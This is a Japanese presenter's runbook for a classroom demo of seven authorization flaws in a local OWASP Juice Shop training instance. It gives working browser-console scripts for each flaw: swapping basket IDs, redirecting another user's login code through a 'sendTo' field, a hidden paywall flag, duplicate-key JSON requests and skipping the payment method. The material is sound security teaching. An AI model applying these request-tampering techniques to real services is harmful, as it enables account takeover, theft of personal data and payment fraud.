# セキュリティデモ実演手順書

更新日: 2026-11-11

新規4件を本編、既存3件を比較用として実演するための手順書。ブラウザ操作と開発者ツールのConsoleを使用する。LLM・メールサーバー・外部の決済サービスは不要。

参加者が各自のPCで起動する場合は、[参加者向けセットアップ](participant-quickstart.md)から始める。

公開事例の出典は [追加候補の調査メモ](ai-discovered-web-vulnerability-candidates.md)、実装とテストの詳細は [新規4件の再現手順](ai-discovered-web-vulnerability-demos.md) を参照。

## 1. 実演順と説明の軸

| 順番 | 演習 | 区分 | 見せる結果 | 目安 |
| --- | --- | --- | --- | --- |
| 1 | View Basket | 既存・比較用 | ログインユーザーはBのまま、Aのカートが見える | 2分 |
| 2 | Signed Out Address Preview | 新規・候補3 | Bでは拒否され、ログアウトするとAの住所が見える | 2分 |
| 3 | Borrowed Delivery Address | 新規・候補4 | Bの注文確認にAの住所が表示される | 3分 |
| 4 | Misdelivered Login Code | 新規・候補1 | Bの受信箱に届いたコードでAにログインできる | 3分 |
| 5 | Recipe Paywall Bypass | 新規・候補2 | 一般会員のままDeluxeレシピを取得できる | 2分 |
| 6 | Manipulate Basket | 既存・比較用 | 単純な改変は拒否され、重複キーを使うとAのカートに商品が入る | 3分 |
| 7 | Deluxe Fraud | 既存・比較用 | 支払い方法を省略すると未払いでDeluxe会員になる | 2分 |

本編だけなら表の順番2〜5（本書の第5〜8章）を実施する。**Deluxe Fraudは最後に行う。** Bを先にDeluxe会員にすると、Recipe Paywall Bypassの「一般会員では見えない」という比較が成立しない。

導入で伝える内容:

> AIが画面・配信されたコード・APIの関係を調べ、認可の抜け道を仮説検証した公開事例を教材化しました。今日はその探索の発想を、短いブラウザ操作で再現します。

この実演自体はAIによる発見のライブ実行ではない。既存演習3件について、最近AIが初めて発見した脆弱性とは説明しない。

## 2. 起動・ブラウザの準備

### 2.1 起動URL

標準URL: <http://localhost:3000>

通常の開発環境では、リポジトリのルートで次を実行する。

```sh
npm install
npm start
```

ソース変更後の再ビルドが必要な場合は、起動前に `npm run build` を実行する。NixOS上で依存関係の構築が必要な場合は、次の構築済みDocker環境を利用できる。

### 2.2 この作業で用意したDocker環境

コンテナ名: `juice-shop-development-20261111`

作業ディレクトリ: `/juice-shop`

公開先: `127.0.0.1:3000`

まず起動状態を確認する。

```sh
docker ps -a --filter name=juice-shop-development-20261111
curl http://localhost:3000/rest/admin/application-version
```

HTTP応答が返れば、そのまま使える。コンテナ自体が停止している場合は `docker start juice-shop-development-20261111` で起動する。このコンテナの起動コマンドは待機用なので、コンテナが動いていてもアプリが未起動なら次を実行する。

```sh
docker exec -d -w /juice-shop juice-shop-development-20261111 sh -c 'npm start > /tmp/juice-shop-demo-app.log 2>&1'
docker exec juice-shop-development-20261111 tail -30 /tmp/juice-shop-demo-app.log
```

既にHTTP応答が返る場合は、アプリの起動コマンドを重ねて実行しない。

### 2.3 ウィンドウを分離する

- 通常ウィンドウを **A用**、プライベート／シークレットウィンドウを **B用**にする。
- 両方で `http://localhost:3000` を開き、WelcomeとCookieの表示を閉じる。
- 表示言語を英語にすると、下記のボタン名と一致する。
- URLは `localhost` に統一する。`127.0.0.1` と混在させると、Cookieや保存領域が別になる。
- 同じ通常ウィンドウの別タブだけではアカウントが分離されない。`localStorage` とCookieを共有するため、A/Bには異なるブラウザプロファイルを使う。

ConsoleはChrome/Edgeなら `Ctrl+Shift+J`、Firefoxなら開発者ツールのConsoleから開く。以降のスクリプトは、それぞれ括弧で囲んだ独立したブロックになっており、同じConsoleで再実行できる。

## 3. アカウント・配送先・カートの事前準備

### 3.1 アカウント

このセッションで用意したアカウントは次のとおり。サーバーを再起動した場合は作り直す。

| 用途 | メールアドレス | パスワード |
| --- | --- | --- |
| A: 対象ユーザー | `demo-owner@juice-sh.op` | `Demo-2026-Local!` |
| B: 操作するユーザー | `demo-user@juice-sh.op` | `Demo-2026-Local!` |

`/#/login` からログインする。まだ存在しない場合は **Not yet a customer?** から登録する。再入力用パスワードも同じ値にし、秘密の質問と回答はデモ用の値を設定する。両アカウントは一般顧客のまま使い、TOTPは設定しない。

### 3.2 配送先

Aで `/#/address/saved` を開き、住所が未登録なら **Add New Address** から登録する。

| 項目 | A | B |
| --- | --- | --- |
| Full name | `Demo Customer A` | `Demo Customer B` |
| Mobile number | `1234567890` | `1234567890` |
| ZIP code | `12345` | `12345` |
| Address | `42 Training Street` | `7 Practice Lane` |
| City | `Demo City` | `Demo City` |
| State | `Demo State` | `Demo State` |
| Country | `Japan` | `Japan` |

Bにも同様に住所を登録する。Aの保存済み住所の目のアイコンを押し、プレビューURLの数値IDを控える。例: `/#/address/preview/7` なら住所IDは `7`。**IDは再起動後や準備の順番によって変わる。**

### 3.3 カート

1. Aで商品を1つカートに入れる。
2. AのConsoleで `sessionStorage.getItem('bid')` を実行し、AのカートIDを控える。
3. Bでも別の商品を1つカートに入れる。
4. A/Bのカートをそれぞれ開き、商品名の違いを確認する。両方が空だと、カートの入れ替わりが画面で伝わらない。

### 3.4 Bの実演用メモを保存する

Bでログインした状態で、次をConsoleに貼り付ける。2つの入力ダイアログに、Aの住所IDとAのカートIDを入力する。

```js
(() => {
  const ownerAddressId = Number(prompt('Aの住所プレビューURLに含まれる数値ID'))
  const ownerBasketId = Number(prompt('AのsessionStorageにあるbidの数値'))
  const userBasketId = Number(sessionStorage.getItem('bid'))
  if (![ownerAddressId, ownerBasketId, userBasketId].every(id => Number.isInteger(id) && id > 0)) {
    throw new Error('住所ID・カートIDを確認してください。')
  }
  const config = {
    ownerEmail: 'demo-owner@juice-sh.op',
    userEmail: 'demo-user@juice-sh.op',
    ownerAddressId, ownerBasketId, userBasketId
  }
  sessionStorage.setItem('securityDemoConfig', JSON.stringify(config))
  console.table(config)
})()
```

このメモにはパスワードやトークンを保存しない。Bのウィンドウを閉じると失われる。アカウント名を変えた場合は、スクリプト内のメールアドレスも変える。

### 3.5 解答状況

`/#/score-board` を開き、実演するチャレンジの解答状況を確認する。スコアはサーバー全体で共有され、A/Bごとの独立スコアではない。解答済みでも動作の再現はできるが、初回の解答通知は再表示されない。

## 4. View Basket（既存・比較用）

**開始状態:** Bでログインし、自分の `/#/basket` を表示している。

1. AccountメニューにBのメールアドレスが表示されることを示す。
2. Bのカートの商品を示す。
3. BのConsoleで次を実行する。

```js
(() => {
  const config = JSON.parse(sessionStorage.getItem('securityDemoConfig'))
  sessionStorage.setItem('bid', String(config.ownerBasketId))
  location.hash = '/basket'
  location.reload()
})()
```

4. AccountメニューはBのまま、カートの商品だけがAのものになる。
5. スコアボードで **View Basket** が解けたことを確認する。

説明の一言:

> ログインできていることと、そのカートを見てよいことは別です。

**次に進む前の復旧:** BのConsoleで次を実行し、自分のカートに戻す。

```js
(() => {
  const config = JSON.parse(sessionStorage.getItem('securityDemoConfig'))
  sessionStorage.setItem('bid', String(config.userBasketId))
  location.hash = '/basket'
  location.reload()
})()
```

## 5. Signed Out Address Preview（新規・候補3）

**開始状態:** Bでログインしている。Aの住所を登録済み。

1. BのConsoleでAのプレビューを開く。

```js
(() => {
  const config = JSON.parse(sessionStorage.getItem('securityDemoConfig'))
  location.hash = `/address/preview/${config.ownerAddressId}`
})()
```

2. `This address belongs to another customer.` と表示され、住所が見えないことを示す。
3. Account → **Logout** を押す。
4. 同じConsoleのスクリプトをもう一度実行する。`securityDemoConfig` はログアウトしても残る。
5. `Demo Customer A`、`42 Training Street`、電話番号が表示される。
6. **Signed Out Address Preview** が解ける。

説明の一言:

> 別の顧客としては拒否されたので、次に未認証で試します。ログアウトすると認可チェックの分岐から抜けてしまいます。

**復旧:** Bとして `/#/login` からログインし直す。プレビュー画面はそのままにせず、次の注文確認へ進む。

## 6. Borrowed Delivery Address（新規・候補4）

**開始状態:** Bとしてログインし、自分のカートを参照している。

### 6.1 正常な注文確認まで進む

1. Bで **Your Basket** → **Checkout** を押す。
2. B自身の住所 `Demo Customer B` を選んで **Continue**。
3. 配送方法を選んで **Continue**。
4. 支払い方法画面で、保存済みのカードを選ぶ。まだなければ **Add new card** でデモ用カードを登録する。

| 項目 | 入力値 |
| --- | --- |
| Name | `Demo Customer B` |
| Card number | `4111111111111111` |
| Expiry month | `12` |
| Expiry year | 選択肢にある将来の年（現在の実装では `2080` など） |

このアプリ内で使う架空のカード情報。保存後にカードのラジオボタンを選び、**Continue** で注文確認へ進む。ウォレット残高が不足している場合はウォレット払いを選ばない。

5. 注文確認で、配送先が `Demo Customer B` であることを示す。

### 6.2 参照先だけを変更する

6. BのConsoleで次を実行する。

```js
(() => {
  const config = JSON.parse(sessionStorage.getItem('securityDemoConfig'))
  sessionStorage.setItem('demoOriginalAddressId', sessionStorage.getItem('addressId'))
  sessionStorage.setItem('addressId', String(config.ownerAddressId))
  location.reload()
})()
```

7. Bのカートと支払い方法は同じまま、配送先がAになる。
8. **Borrowed Delivery Address** が解ける。**Place your order and payは押さない。** 住所の表示までで成立する。

説明の一言:

> カートの所有者は正しく確認しています。でも、そのカートに関連付ける住所の所有者を確認していません。

**復旧:** 次のConsole操作でB自身の住所に戻す。その後は注文を確定せず別のページへ移動する。

```js
(() => {
  const addressId = sessionStorage.getItem('demoOriginalAddressId')
  if (!addressId || addressId === 'null') throw new Error('B自身の住所を選び直してください。')
  sessionStorage.setItem('addressId', addressId)
  location.reload()
})()
```

## 7. Misdelivered Login Code（新規・候補1）

**開始状態:** Bでログインしている。A/Bは一般顧客で、TOTPは未設定。

### 7.1 正常な送信先を確認する

1. Bで `/#/email-login` を開き、Bのメールアドレスで **Send sign-in code** を押す。
2. 別タブでBの `/#/mailbox` を開き、**Refresh inbox** を押すとコードが見える。
3. そのタブを閉じ、実演はBの元のウィンドウで続ける。

### 7.2 AのコードをBに送る

4. Bで `/#/mailbox` を開く。
5. Consoleで次を実行する。

```js
(async () => {
  const config = JSON.parse(sessionStorage.getItem('securityDemoConfig'))
  const response = await fetch('/rest/user/email-login/request', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      email: config.ownerEmail,
      sendTo: config.userEmail,
      codeChannel: 'EMAIL'
    })
  })
  const body = await response.json()
  if (!response.ok) throw new Error(body.error)
  sessionStorage.setItem('demoOtpRequestId', body.data.requestId)
  console.log('AのログインコードをBのメールボックスに送信しました。')
})()
```

6. **Refresh inbox** を押す。送信先表示はBのまま、コードが届く。
7. 直前の正常送信コードも残っている場合は、**後から表示されたコード**を選ぶ。新しい要求は一覧の末尾に追加される。

### 7.3 正規のコードでAにログインする

8. 次のスクリプトを実行し、入力ダイアログに後から届いた6桁を入力する。

```js
(async () => {
  const code = prompt('Aへのログイン要求でBに届いた6桁のコード')
  const response = await fetch('/rest/user/email-login/verify', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ requestId: sessionStorage.getItem('demoOtpRequestId'), code })
  })
  const body = await response.json()
  if (!response.ok || !body.authentication) throw new Error(body.error || 'コードを確認してください。')
  const authentication = body.authentication
  localStorage.setItem('token', authentication.token)
  document.cookie = `token=${authentication.token}; path=/`
  sessionStorage.setItem('bid', String(authentication.bid))
  location.reload()
})()
```

9. メールボックスの所有者表示がAになる。AccountメニューもAになり、**Misdelivered Login Code** が解ける。

説明の一言:

> コードを当てていません。正しいコードを、こちらの受信箱に送ってもらいました。

**復旧:** B用ウィンドウで一度ログアウトし、Bとして再ログインする。次のレシピデモをAのままで進めない。`securityDemoConfig` はそのまま使える。

コードは5分で失効する。同じAのコードを再発行すると古い要求は無効になる。5回誤入力した場合も、送信からやり直す。OTPを送信しただけではチャレンジは解けない。

## 8. Recipe Paywall Bypass（新規・候補2）

**開始状態:** Bでログインし、まだDeluxe会員になっていない。

1. `/#/recipes` を開く。
2. 無料の **Apple Cooler** は読めるが、**Carrot & Apple Blend** の材料と手順は会員限定であることを示す。
3. 開発者ツールのSourcesで `includeInstructions` を検索し、通常の検索画面では送られていないオプションがあることを示す。
4. Consoleで、通常の検索とフラグ付き検索を比較する。

```js
(async () => {
  const headers = {
    'Content-Type': 'application/json',
    Authorization: `Bearer ${localStorage.getItem('token')}`
  }
  for (const params of [
    { query: 'Carrot' },
    { query: 'Carrot', includeInstructions: true }
  ]) {
    const response = await fetch('/rest/recipes/search', {
      method: 'POST', headers, body: JSON.stringify(params)
    })
    const body = await response.json()
    if (!response.ok) throw new Error(body.error)
    console.log(params)
    console.table(body.data)
  }
})()
```

5. 通常要求では `ingredients` と `instructions` が `null`。フラグ付きでは全文が返る。
6. **Recipe Paywall Bypass** が解ける。
7. ページを再読み込みすると、通常画面では引き続き会員限定表示になる。一般会員のままで、会員資格そのものが変化したわけではない。

説明の一言:

> 画面には解除ボタンがなくても、配信されたコードから使われていないオプションを見つけられます。サーバーがそれを権限の証明として信頼しています。

このConsole手順では、取得した全文はConsoleとNetworkの応答に表示される。通常画面を書き換える操作ではない。画面上に全文を出したい場合は、検索要求を書き換えるプロキシで `includeInstructions: true` を追加する。Cypress E2Eではこの経路で実際の表示を検証している。

**復旧:** 不要。Bは一般会員のまま。

## 9. Manipulate Basket（既存・比較用）

**開始状態:** Bでログインし、カートIDはB自身のものに戻っている。Aのカートにまだ商品がある。

1. A用ウィンドウで `/#/basket` を表示しておく。
2. BのConsoleで次を実行する。Aのカートにまだ入っていない商品を1つ選び、単純な変更と重複キー付きの要求を比較する。

```js
(async () => {
  const config = JSON.parse(sessionStorage.getItem('securityDemoConfig'))
  const headers = {
    'Content-Type': 'application/json',
    Authorization: `Bearer ${localStorage.getItem('token')}`
  }
  const target = await fetch(`/rest/basket/${config.ownerBasketId}`, { headers }).then(r => r.json())
  const catalog = await fetch('/rest/products/search?q=').then(r => r.json())
  const product = catalog.data.find(p => !target.data.Products.some(item => item.id === p.id))
  if (!product) throw new Error('Aのカートにない商品を用意してください。')
  const normal = await fetch('/api/BasketItems/', {
    method: 'POST', headers,
    body: JSON.stringify({ ProductId: product.id, BasketId: String(config.ownerBasketId), quantity: 1 })
  })
  console.log('単純な変更:', normal.status, await normal.text())
  const duplicate = await fetch('/api/BasketItems/', {
    method: 'POST', headers,
    body: `{"ProductId":${product.id},"BasketId":"${config.userBasketId}","quantity":1,"BasketId":"${config.ownerBasketId}"}`
  })
  console.log('重複キー:', duplicate.status, await duplicate.text(), '追加した商品:', product.name)
})()
```

3. 最初の要求はHTTP 401の `Invalid BasketId`。重複キー付きの要求はHTTP 200になり、Aのカートへの追加が返る。
4. A用ウィンドウで再読み込みし、本当に商品が追加されたことを示す。
5. **Manipulate Basket** が解ける。

説明の一言:

> 先頭のカートIDで認可し、末尾のカートIDで更新しています。同じ要求でも、確認するときと使うときの解釈が違います。

JSONのオブジェクトに重複キーを書いてから `JSON.stringify` すると、送信前に1つへ整理されてしまう。このデモでは、重複を残すため要求本文を文字列で作っている。

在庫や購入制限のエラーが返った場合は、Aのカートにない別の在庫商品を選んで同じ比較を行う。解答通知だけでなく、Aの実際のカートへの追加まで確認する。

**復旧:** Aの画面から追加した商品を削除する。Bのログイン状態は変化しない。

## 10. Deluxe Fraud（既存・比較用、最後に実施）

**開始状態:** Bでログインし、一般会員のまま。Recipe Paywall Bypassを先に終えている。

1. `/#/deluxe-membership` で会費 `49¤` を示す。
2. BのConsoleで、支払い方法を省略した要求を送る。

```js
(async () => {
  const headers = {
    'Content-Type': 'application/json',
    Authorization: `Bearer ${localStorage.getItem('token')}`
  }
  const before = await fetch('/rest/wallet/balance', { headers }).then(r => r.json())
  const response = await fetch('/rest/deluxe-membership', {
    method: 'POST', headers, body: JSON.stringify({})
  })
  const body = await response.json()
  if (!response.ok || !body.data?.token) throw new Error(body.error || '一般会員で実行してください。')
  localStorage.setItem('token', body.data.token)
  document.cookie = `token=${body.data.token}; path=/`
  const after = await fetch('/rest/wallet/balance', {
    headers: { Authorization: `Bearer ${body.data.token}` }
  }).then(r => r.json())
  console.table({ before: before.data, after: after.data })
  console.log(body.data.confirmation)
  location.reload()
})()
```

3. ウォレット残高が変化せず、`You are already a deluxe member!` が表示される。
4. **Deluxe Fraud** が解ける。
5. `/#/recipes` を開くと、フラグなしの通常画面でもDeluxeレシピが読める。前の課金回避との違いを示す。

説明の一言:

> 「カード払いならカードを確認」「ウォレット払いなら残高を確認」のどちらにも入らない値を送ると、そのまま会員資格を付けてしまいます。

**復旧:** ログアウトだけでは一般会員に戻らない。次回は新しい一般顧客を登録して実演用メモを作り直すか、次章のリセットからやり直す。

## 11. 終了・再実演・復旧

### 11.1 各デモの終わりに確認すること

- B用ウィンドウのAccountメニューが意図したメールアドレスになっている。
- `sessionStorage.bid` はB自身のカートIDに戻っている。
- 注文確認の配送先はB自身に戻している。
- 初回の成功通知と、実際の表示・変更結果を両方確認した。

### 11.2 最初からやり直す場合

アプリは起動時にデータを作り直す。再起動するとデモ用アカウント、住所、カート、メールコード、会員資格なども作り直しになる。

ブラウザのローカルバックアップから解答状況が復元されることがあるので、初回通知を再度見せたい場合は次の順で準備する。

1. A/B両方のブラウザで、開発者ツールのApplication／Storageから `http://localhost:3000` のサイトデータを消す。
2. A/Bのアプリのタブを閉じる。プライベートウィンドウも閉じる。
3. サーバーを停止して起動し直す。
4. ブラウザを開き直し、アカウント・住所・カートを第3章から作り直す。
5. 数値IDを取り直す。以前の住所IDやカートIDは使い回さない。

この作業で作ったDocker環境をリセットする場合:

```sh
docker restart juice-shop-development-20261111
docker exec -d -w /juice-shop juice-shop-development-20261111 sh -c 'npm start > /tmp/juice-shop-demo-app.log 2>&1'
docker exec juice-shop-development-20261111 tail -30 /tmp/juice-shop-demo-app.log
```

`Server listening on port 3000` を確認してからブラウザで準備を再開する。

### 11.3 よくある停止点

| 症状 | 確認・復旧 |
| --- | --- |
| `securityDemoConfig` がない／`null`になる | Bのウィンドウで第3.4節を実行する。別タブへのコピーでは `sessionStorage` が共有されない場合があるので、元のタブを使う |
| ログインユーザーが想定と違う | Accountメニューを確認する。OTPデモ後はAになっているため、Bにログインし直す |
| HTTP 401になる | Bにログインし直す。`localhost` と `127.0.0.1` が混ざっていないか確認する |
| BでAのプレビューを拒否されない | BでなくAにログインしていないか確認する。未認証でも表示されるのがこの演習の欠陥 |
| OTPが見つからない | BのメールボックスでRefresh。`sendTo` のメールアドレス、5分の期限、再発行の有無を確認する |
| OTPは届くが検証できない | 一覧の末尾のコードと、直前に保存した要求IDを組み合わせる。再送後の古いコードは使わない |
| レシピが最初から読める | Bが既にDeluxe会員。新しい一般顧客で再開する |
| 注文確認まで進めない | Bのカートに商品があるか、住所・配送方法・カードを選んだか確認する。残高0のウォレットでは支払い選択を進められない |
| 配送先変更後も表示されない | Aの住所IDとBのカートIDを再確認する。Networkで `/rest/basket/<BのID>/address` の応答を見る |
| 重複キーの要求が拒否される | Bとしてログインし、先頭がBのカートID、末尾がAのカートIDか確認する。本文はオブジェクトでなく文字列にする |
| 成功しても解答通知が出ない | 既に解答済みかスコアボードで確認する。スコアはサーバー全体で共有される |
| DevToolsが貼り付けを制限する | 内容を確認したうえで、そのブラウザが案内する操作に従う。アプリの不具合ではない |

## 12. リハーサルと検証済み範囲

新規4件のCypress E2Eと既存Deluxe演習は実行済み。View BasketとManipulate Basketは既存の実装・Cypress手順に照合した比較用の説明であり、この手順書の作成時には通しのライブ実演を追加実行していない。

```sh
npx cypress run --spec 'test/cypress/e2e/emailLogin.spec.ts,test/cypress/e2e/recipes.spec.ts,test/cypress/e2e/addressBoundaries.spec.ts,test/cypress/e2e/deluxe.spec.ts'
```

E2Eを実行すると、実演用サーバーの一部アカウントや解答状況も変化する。リハーサル後に初回状態で見せる場合は、第11.2節から準備する。

ビルド・lint・RSN、単体・APIテストの結果と既存のAPIテスト13件の失敗については、[検証結果](ai-discovered-web-vulnerability-demos.md#検証結果2026-11-11)を参照。
